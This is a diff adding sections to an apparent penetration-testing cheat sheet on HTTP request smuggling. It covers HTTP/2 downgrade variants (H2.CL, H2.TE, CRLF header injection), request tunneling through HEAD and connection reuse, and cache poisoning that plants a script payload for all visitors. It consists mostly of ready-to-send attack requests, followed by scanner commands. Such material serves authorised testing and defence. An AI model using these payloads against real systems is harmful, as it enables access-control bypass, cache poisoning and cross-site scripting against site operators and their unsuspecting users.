@@ -422,3 +422,94 @@ python h2csmuggler.py -x https://target.com --scan-list paths.txt
 - [ ] 8. Confirm desync with differential response (not just timing)
 - [ ] 9. Demonstrate impact: WAF bypass, cache poison, or auth bypass
 - [ ] 10. Document: technique used, affected endpoints, reproduction steps, remediation (normalize parsing, disable connection reuse, reject ambiguous requests)
+
+---
+
+## HTTP/2 Downgrade Smuggling
+
+When front-end speaks HTTP/2 but back-end expects HTTP/1.1:
+
+### H2.CL (HTTP/2 → Content-Length mismatch)
+```
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+```
+Front-end forwards as HTTP/1.1 with CL:0, back-end sees smuggled second request.
+
+### H2.TE (HTTP/2 → Transfer-Encoding injection)
+```
+:method: POST
+:path: /
+:authority: target.com
+transfer-encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+```
+HTTP/2 doesn't use chunked encoding — but if proxy downgrades to H1, TE header becomes active.
+
+### Header Injection via HTTP/2 HPACK
+```
+:method: POST
+:path: /
+foo: bar\r\nTransfer-Encoding: chunked
+```
+Some proxies fail to sanitize `\r\n` in HTTP/2 header values during downgrade.
+
+---
+
+## Request Tunneling
+
+Smuggle a full request through a front-end that rewrites/blocks certain paths:
+
+### Tunnel via HEAD
+```
+HEAD / HTTP/1.1
+Host: target.com
+Content-Length: 83
+
+GET /admin HTTP/1.1
+Host: target.com
+Connection: close
+
+```
+HEAD response has no body — back-end treats leftover bytes as next request.
+
+### Tunnel via Connection Reuse
+1. Send valid request that gets 301/302 redirect (connection kept alive)
+2. Smuggled bytes sit in buffer
+3. Next legitimate user's request gets poisoned response
+
+### Web Cache Poisoning via Smuggling
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /static/main.js HTTP/1.1
+Host: target.com
+X-Injected: <script>alert(1)</script>
+
+```
+Cache stores poisoned response for `/static/main.js` — all visitors get XSS.
+
+---
+
+## Detection Tools
+
+- **Burp HTTP Request Smuggler** extension (auto-detects CL.TE, TE.CL, H2.*)
+- **smuggler.py**: `python3 smuggler.py -u https://target.com`
+- **h2csmuggler**: `python3 h2csmuggler.py -x https://target.com/`
+- **Turbo Intruder**: timing-based detection scripts
